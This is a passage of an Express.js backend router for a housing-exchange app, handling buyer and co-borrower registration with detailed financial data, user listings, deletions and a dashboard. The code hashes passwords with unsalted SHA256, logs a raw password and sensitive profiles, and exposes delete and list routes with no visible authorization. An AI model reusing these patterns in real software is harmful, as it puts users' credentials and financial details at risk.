              if (propertyDetails) profile.propertyDetails = propertyDetails;

              profile.save(async (err, profile) => {
                console.log(err, profile);
                if (err)
                  return response.send(
                    utils.createError("Couldn't update profile!")
                  );
                response.send(utils.createSuccess(profile));
              });
            }
          });
        } else {
          response.send(utils.createError("Profile Not Created Yet!"));
        }
      }
    });
  }
);

/**
 * Add Buyer and profile
 */
router.post("/add-buyer", async (request, response) => {
  const {
    fullName,
    email,
    password,
    referredBy,
    role,
    roleId,
    consent,
    firstName,
    lastName,
    isCoBorrower,
    birthdate,
    street_address,
    city,
    state,
    zip,
    areaCode,
    phone,
    currently_living,
    monthlyfee,
    leaseEndDate,
    available_savings,
    marital_status,
    mployment_status,
    employer,
    No_of_years_Employed,
    former_employer,
    net_income,
    incomeFreq,
    FICOScore,
    rePosDate,
    bills_current,
    financial_status,
    bankruptcy,
    dichargeDate,
    judgementSettled,
    foreClosureDate,
    studentLoanDate,
    studentLoanAmount,
    federal_department,
    other_department,
    federal_employee,
    veteran,
    honorably_discharged,
    listened_about_us,
    maxMortgagePayment,
    zipCodes,
    bedrooms,
    bathrooms,

    allStepsCompleted,
    leftAtStep,
    device_token,
  } = request.body;

  const {
    co_firstName,
    co_lastName,
    co_email,
    co_birthdate,
    co_street_address,
    co_city,
    co_state,
    co_zip,
    co_areaCode,
    co_phone,
    co_homePhone,
    co_currently_living,
    co_monthlyfee,
    co_leaseEndDate,
    co_available_savings,
    co_marital_status,
    co_employment_status,
    co_employer,
    co_No_of_years_Employed,
    co_former_employer,
    co_net_income,
    co_incomeFreq,
    co_FICOScore,
    co_rePosDate,
    co_bills_current,
    co_financial_status,
    co_bankruptcy,
    co_dichargeDate,
    co_judgementSettled,
    co_foreClosureDate,
    co_studentLoanDate,
    co_studentLoanAmount,
    co_federal_department,
    co_other_department,
    co_federal_employee,
    co_veteran,
    co_honorably_discharged,
  } = request.body;

  if (!utils.validateEmail(email.toLowerCase())) {
    response.send(utils.createError("Invalid email"));
  } else if (!password || password.length < 6) {
    console.log("password error", password);
    response.send(
      utils.createError("Paasword should atleast be 6 characters long")
    );
  } else {
    User.findOne({ $or: [{ email: email }] }, async (error, user) => {

      if (error) {
        return response.send(utils.createError("Database error"));
      } else if (user) {
        return response.send(
          utils.createError(
            "This phone number and/or email is already registered with us"
          )
        );
      } else {
        const user = new User();
        user.fullName = fullName || "";
        user.email = email || "";
        user.role = role || "buyer";
        if (roleId) user.roleId = roleId;
        user.consent = consent;
        user.password = cryptoJs.SHA256(password);
        if (referredBy) user.referredBy = referredBy;
        user.device_token = device_token;
        user.emailVerified = true;



        /* Generating refferal code */
        let rand = Math.floor(Math.random() * 9);
        let c = await User.estimatedDocumentCount();
        user.referalCode = `RF${211110 + rand + 18 * 10 + c}`;
        let cf = await User.count({ referalCode: user.referalCode });
        while (cf > 0) {
          console.log(user.referalCode, cf);
          rand = Math.floor(Math.random() * 9);
          user.referalCode = `RF${211110 + rand + 18 * 10 + c}`;
          cf = await User.count({ referalCode: user.referalCode });
        }

        let token;
        if (user && user._id) {
          token = jwt.sign(
            {
              id: user._id,
              email: `${user.email}`,
              role: user.role,
            },
            config.secret
          );
          response.header("X-Auth-Token", token);
        }
        user.access_token = token;
        user.isProfileComplete = true;
        user.save(async (error, user) => {

          if (error) {
            return response.send(utils.createResult("Database error"));
          } else if (user) {
            console.log("222user", user)
            let buyer = new BuyerProfile();
            let cobuyer = new BuyerProfile();
            let result = {};
            BuyerProfile.find({ userId: user._id }, (err, profiles) => {
              console.log("Profile ....", profiles);
              if (err) {
                return response.send(utils.createError("Database error"));
              } else if (!profiles || profiles.length === 0) {
                console.log("no profile yet");

                buyer.firstName = firstName;//1
                buyer.lastName = lastName;
                buyer.isCoBorrower = isCoBorrower;
                buyer.email = user.email;
                buyer.userId = user._id;

                buyer.email = email; // 2
                buyer.birthdate = birthdate;
                buyer.street_address = street_address;
                buyer.phone = phone;
                buyer.city = city;
                buyer.state = state;
                buyer.zip = zip;
                buyer.areaCode = areaCode;

                buyer.currently_living = currently_living; // 3
                buyer.monthlyfee = monthlyfee;
                buyer.leaseEndDate = leaseEndDate;
                buyer.available_savings = available_savings;
                buyer.marital_status = marital_status;

                buyer.mployment_status = mployment_status; // 4
                buyer.employer = employer;
                buyer.No_of_years_Employed = No_of_years_Employed;
                buyer.former_employer = former_employer;
                buyer.net_income = net_income;
                buyer.isCoBorrower = isCoBorrower;
                buyer.incomeFreq = incomeFreq;
                buyer.FICOScore = FICOScore;
                buyer.allStepsCompleted = allStepsCompleted;
                buyer.leftAtStep = leftAtStep;
                buyer.rePosDate = rePosDate;

                buyer.bills_current = bills_current; // 5
                buyer.financial_status = financial_status;
                buyer.bankruptcy = bankruptcy;
                buyer.dichargeDate = dichargeDate;
                buyer.judgementSettled = judgementSettled;
                buyer.foreClosureDate = foreClosureDate;
                buyer.studentLoanDate = studentLoanDate;
                buyer.studentLoanAmount = studentLoanAmount;
                buyer.federal_department = federal_department; // 6
                buyer.other_department = other_department;
                buyer.federal_employee = federal_employee;
                buyer.veteran = veteran;
                buyer.honorably_discharged = honorably_discharged;

                buyer.listened_about_us = listened_about_us
                buyer.maxMortgagePayment = maxMortgagePayment
                buyer.zipCodes = zipCodes
                buyer.bedrooms = bedrooms
                buyer.bathrooms = bathrooms

                if (JSON.parse(isCoBorrower)) {
                  console.log("------------------------inside ", isCoBorrower);
                  cobuyer.firstName = co_firstName;
                  cobuyer.lastName = co_lastName;
                  cobuyer.userId = user._id;
                  cobuyer.isCoBorrowerProfile = true;

                  cobuyer.email = co_email; /* 2 */
                  cobuyer.birthdate = co_birthdate;
                  cobuyer.street_address = co_street_address;
                  cobuyer.city = co_city;
                  cobuyer.state = co_state;
                  cobuyer.zip = co_zip;
                  cobuyer.phone = co_phone;
                  cobuyer.homePhone = co_homePhone;
                  cobuyer.areaCode = co_areaCode;

                  cobuyer.currently_living = co_currently_living; /* 3 */
                  cobuyer.monthlyfee = co_monthlyfee;
                  cobuyer.leaseEndDate = co_leaseEndDate;
                  cobuyer.available_savings = co_available_savings;
                  cobuyer.marital_status = co_marital_status;

                  cobuyer.employment_status = co_employment_status; /* 4 */
                  cobuyer.employer = co_employer;
                  cobuyer.No_of_years_Employed = co_No_of_years_Employed;
                  cobuyer.former_employer = co_former_employer;
                  cobuyer.net_income = co_net_income;
                  cobuyer.incomeFreq = co_incomeFreq;
                  cobuyer.FICOScore = co_FICOScore;
                  cobuyer.rePosDate = co_rePosDate;

                  cobuyer.bills_current = co_bills_current; /* 5 */
                  cobuyer.financial_status = co_financial_status;
                  cobuyer.bankruptcy = co_bankruptcy;
                  cobuyer.dichargeDate = co_dichargeDate;
                  cobuyer.judgementSettled = co_judgementSettled;
                  cobuyer.foreClosureDate = co_foreClosureDate;
                  cobuyer.studentLoanDate = co_studentLoanDate;
                  cobuyer.studentLoanAmount = co_studentLoanAmount;
                  cobuyer.federal_department = co_federal_department
                  cobuyer.other_department = co_other_department
                  cobuyer.federal_employee = co_federal_employee
                  cobuyer.veteran = co_veteran
                  cobuyer.honorably_discharged = co_honorably_discharged
                  console.log("------------------------inside ", isCoBorrower, cobuyer);

                }
              }

              buyer.allStepsCompleted = true;
              buyer.leftAtStep = 8;
              user.leftAtStep = 8;
              console.log("------------------------cobuyer---------- ", isCoBorrower, cobuyer);

              console.log("buyer----------------------------------", buyer);
              buyer.save((err, buyer) => {
                console.log(err, buyer);
                if (err)
                  return response.send(
                    utils.createError("Couldn't save buyer!")
                  );
                if (JSON.parse(isCoBorrower)) {
                  console.log("before save cobuyer", cobuyer);
                  cobuyer.save((err, cobuyer) => {
                    console.log(err, cobuyer);
                    if (err)
                      return response.send(
                        utils.createError("Couldn't save cobuyer!")
                      );
                    user.borrowerProfile = buyer._id;
                    user.coBorrowerProfile = cobuyer._id;
                    user.isCoBorrower = isCoBorrower;
                    user.save((error, result) => {
                      console.log(error, result);
                      if (error)
                        return response.send(
                          utils.createError("Database error")
                        );
                      response.send(utils.createSuccess({ buyer, cobuyer }));
                    });
                  });
                } else {
                  user.borrowerProfile = buyer._id;
                  user.isCoBorrower = isCoBorrower;
                  user.save((error, result) => {
                    console.log(error, result);
                    if (error)
                      return response.send(utils.createError("Database error"));

                    let title = `New ${user.role} Application`;
                    let messageHtml = `<h3>Hello!</h3><p>${user.fullName} has submitted a new ${user.role} application.</p><br><p>US Housing Exchange</p>`;
                    let message = `Hello! ${user.fullName} has submitted a new ${user.role} application. US Housing Exchange`;

                    registerEmailSend(
                      result,
                      title,
                      message,
                      messageHtml,
                      user,
                      response,
                      error
                    );
                  });
                }
              });
              // BuyerProfile.find({ userId: request.userId }, (err, profiles) => {

              // })
            });
          } else {
            response.send(utils.createError("Something went wrong"));
          }
        });
      }
    });
  }
});

router.get("/user/getAll/:projectId?", async (request, response) => {
  try {
    const { projectId } = request.params;

    let buyers = await User.find(
      { role: "buyer", deleted: false, status: "approved" },
      { fullName: 1, email: 1, phone: 1, isdCode: 1 }
    );
    let sellers = await User.find(
      { role: "seller", deleted: false, status: "approved" },
      { fullName: 1, email: 1, phone: 1, isdCode: 1 }
    );
    let contractors = await User.find(
      { role: "contractor", deleted: false, status: "approved" },
      { fullName: 1, email: 1, phone: 1, isdCode: 1 }
    );
    let constructionManagers = await Admin.find(
      { role: { $ne: "admin" }, deleted: false },
      { fullName: 1, email: 1, phone: 1, isdCode: 1 }
    );
    let realtors = await User.find(
      {
        role: "affiliate",
        affiliate_type: "Realtors",
        deleted: false,
        status: "approved",
      },
      { fullName: 1, email: 1, phone: 1, isdCode: 1 }
    );
    let loanOfficers = await User.find(
      {
        role: "affiliate",
        affiliate_type: "Loan Officers",
        deleted: false,
        status: "approved",
      },
      { fullName: 1, email: 1, phone: 1, isdCode: 1 }
    );
    let accountExecutives = await User.find(
      {
        role: "affiliate",
        affiliate_type: "Account Executives",
        deleted: false,
        status: "approved",
      },
      { fullName: 1, email: 1, phone: 1, isdCode: 1 }
    );
    let properties = await Property.find({
      deleted: false,
      property_approved_status: "approved",
    });

    if (projectId) {
      let project = await Project.findOne({ _id: projectId });

      return response.send(
        utils.createSuccess({
          buyers,
          sellers,
          realtors,
          loanOfficers,
          contractors,
          constructionManagers,
          accountExecutives,
          properties,
          project,
        })
      );
    }

    response.send(
      utils.createSuccess({
        buyers,
        sellers,
        realtors,
        loanOfficers,
        contractors,
        constructionManagers,
        accountExecutives,
        properties,
      })
    );
  } catch (ex) {
    console.log("Error:", ex);
    response.send(utils.createError("Something went wrong!"));
  }
});

router.get("/users/sca", async (request, response) => {
  try {
    let constructionManagers = await Admin.find({
      role: { $ne: "admin" },
      deleted: false,
    });

    response.send(utils.createSuccess(constructionManagers));
  } catch (ex) {
    console.log("Error:", ex);
    response.send(utils.createError("Something went wrong!"));
  }
});

router.get("/users/:role?", async (request, response) => {
  try {
    const { role } = request.params;

    console.log({
      role: role,
    });

    let users;

    if (role) {
      users = await User.find({ role: role, deleted: false }, { password: 0 });
    } else {
      users = await Admin.find(
        { role: "admin", deleted: false },
        { password: 0 }
      );
    }

    response.send(utils.createSuccess(users));
  } catch (ex) {
    console.log("Error:", ex);
    response.send(utils.createError("Something went wrong!"));
  }
});

router.delete("/user/:userId", async (request, response) => {
  const { userId } = request.params;

  try {
    let constructionManager = await Admin.findOneAndUpdate(
      { _id: userId },
      { deleted: true }
    );

    response.send(utils.createSuccess(constructionManager));
  } catch (ex) {
    console.log("Error:", ex);
    response.send(utils.createError("Something went wrong!"));
  }
});

router.delete("/application/:applicationId", async (request, response) => {
  const { applicationId } = request.params;
  console.log({
    applicationId,
  });
  try {
    var application = await User.findById(applicationId);

    application.deleted = true;

    application.save((err, data) => {
      console.log({
        err,
        data,
      });

      response.send(utils.createSuccess(application));
    });

    console.log({
      application,
    });
  } catch (ex) {
    console.log("Error:", ex);
    response.send(utils.createError("Something went wrong!"));
  }
});

router.get("/dashboard", async (request, response) => {
  let dashboard = {};
  let applications = await User.countDocuments({ deleted: false });
  let pendingApplications = await User.countDocuments({
    status: "pending",
    deleted: false,
  });
  let approvedApplications = await User.countDocuments({
    status: "approved",
    deleted: false,
  });
  let rejectedApplications = await User.countDocuments({
    status: "rejected",
    deleted: false,
  });

  let contractors = await User.countDocuments({
    role: "contractor",
    deleted: false,
  });
  let buyers = await User.countDocuments({ role: "buyer", deleted: false });
  let sellers = await User.countDocuments({ role: "seller", deleted: false });
  let affiliates = await User.countDocuments({
    role: "affiliate",
    deleted: false,
  });
  let SCA = await Admin.countDocuments({
    role: "construction",
    deleted: false,
  });

  let totalProjects = await Project.countDocuments({ deleted: false });
  let activeProjects = await Project.countDocuments({
    status: "active",
    deleted: false,
  });
  let inactiveProjects = await Project.countDocuments({
    status: { $ne: "active" },
    deleted: false,
  });

  let properties = await Property.countDocuments({ deleted: false });
  let pendingProperties = await Property.countDocuments({
    property_approved_status: "pending",
    deleted: false,
  });
  let approvedProperties = await Property.countDocuments({
    property_approved_status: "approved",
    deleted: false,
  });
  let rejectedProperties = await Property.countDocuments({
    property_approved_status: "rejected",
    deleted: false,
  });

  let applicationGraph = await User.aggregate([
    {
      $match: {
        createdAt: {
          $gte: new Date(new Date().setDate(new Date().getDate() - 15)),
          $lte: new Date(),
        },
      },
    },
    {
      $group: {
        _id: {
          day: { $dayOfMonth: "$createdAt" },
          month: { $month: "$createdAt" },
          year: { $year: "$createdAt" },
        },
        count: { $sum: 1 },
        date: { $first: "$createdAt" },
      },
    },
    {
      $sort: { date: -1 },
    },
    {
      $project: {
        date: {
          $dateToString: { format: "%Y-%m-%d", date: "$date" },
        },
        count: 1,
        _id: 0,
      },
    },
  ]);

  let propertyGraph = await Property.aggregate([
    {
      $match: {
        createdAt: {
          $gte: new Date(new Date().setDate(new Date().getDate() - 15)),
          $lte: new Date(),
        },
      },
    },
    {
      $group: {
        _id: {
          day: { $dayOfMonth: "$createdAt" },
          month: { $month: "$createdAt" },
          year: { $year: "$createdAt" },
        },
        count: { $sum: 1 },
        date: { $first: "$createdAt" },
      },
    },
    {
      $sort: { date: -1 },
    },
    {
      $project: {
        date: {
          $dateToString: { format: "%Y-%m-%d", date: "$date" },
        },
        count: 1,
        _id: 0,
      },
    },
  ]);

  return response.send(
    utils.createSuccess({
      applications,
      pendingApplications,
      approvedApplications,
      rejectedApplications,
      properties,
      pendingProperties,
      approvedProperties,
      rejectedProperties,
      contractors,
      buyers,
      sellers,
      affiliates,
      SCA,
      activeProjects,
      inactiveProjects,
      applicationGraph,
      propertyGraph,
    })
  );
});

/* For mobile to get the phases, properties, contractors and trades */
router.get("/get-job-adding-details/:projectId", (req, res) => {
  if (req.role == "admin") {
    const { projectId } = req.params;

    let data = {
      properties: [],
      contractors: [],
      phases: [],
      trades: [
        "Bathroom",
        "Carpet",
        "Carpentry",
        "Concrete",
        "Demo",
        "Electrician",
        "Flooring",
        "HVAC",
        "Kitchen",
        "Landscaping",
        "Painting",
        "Plumbing",
        "Siding",
        "Windows",
      ],
      project: {},
    };

    /* Get properties */
    Property.find(
      { deleted: false },
      { deleted: 0, __v: 0, createdOn: 0 },
      (errP, properties) => {
        if (errP) {
          return res.send(utils.createError(errP));
        } else {
          data.properties = properties;

          /* Get contractors */
          User.find(
            { deleted: false, role: "contractor" },
            { deleted: 0, __v: 0, createdOn: 0 },
            (errU, contractors) => {
              if (errU) {
                return res.send(utils.createError(errU));
              } else {
                data.contractors = contractors;

                /* Get phases */
                Phase.find(
                  { deleted: false, project: projectId },
                  (errP, phases) => {
                    if (errP) {
                      return res.send(utils.createError(errP));
                    } else {
                      data.phases = phases;

                      return res.send(utils.createResult(null, data));
                    }
                  }
                );
              }
            }
          );
        }
      }
    );
  } else {
    return res.send(
      utils.createError("You are not authorised for this request.")
    );
  }
});

/* To be used when creating an account */
async function registerEmailSend(
  result,
  title,
  message,
  messageHtml,
  user,
  response,
  error
) {
  // admin@ushousingexchange.com for testing uncomment
  mailer.sendEmail(
    "akshayad@mailinator.com",
    title,
    messageHtml,
    (err, data) => {
      console.log("Admin Email", err, data);
    }
  );

  /* Email to the user who created account */
  title = `Account Created`;
  message = `<h3>Hello ${user.fullName}!</h3><p>Your account has been created on the US Housing Exchange. Application has been submitted.</p><p>US Housing Exchange</p>`;
  mailer.sendEmail(user.email, title, message, (err, data) => {
    console.log("User Email", err, data);
    response.send(utils.createResult(error, result.safeUser()));
  });
}

module.exports = router;
